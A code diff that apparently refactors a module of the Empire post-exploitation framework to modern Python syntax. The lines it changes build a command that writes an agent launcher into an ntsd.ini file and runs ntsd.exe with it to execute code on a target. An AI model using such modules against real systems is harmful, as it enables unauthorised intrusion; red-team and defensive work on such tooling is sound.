@@ -1,13 +1,10 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -78,12 +75,8 @@ class Module(object):
                 with open(ntsd_dll, "rb") as bin_data:
                     ntsd_dll_data = bin_data.read()
 
-                exec_write = 'Write-Ini %s "%s"' % (upload_path, launcher)
-                code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (
-                    upload_path,
-                    upload_path,
-                    bin,
-                )
+                exec_write = f'Write-Ini {upload_path} "{launcher}"'
+                code_exec = f"{upload_path}\\ntsd.exe -cf {upload_path}\\ntsd.ini {bin}"
                 ntsd_exe_upload = main_menu.stagers.generate_upload(
                     ntsd_exe_data, ntsd_exe_upload_path
                 )
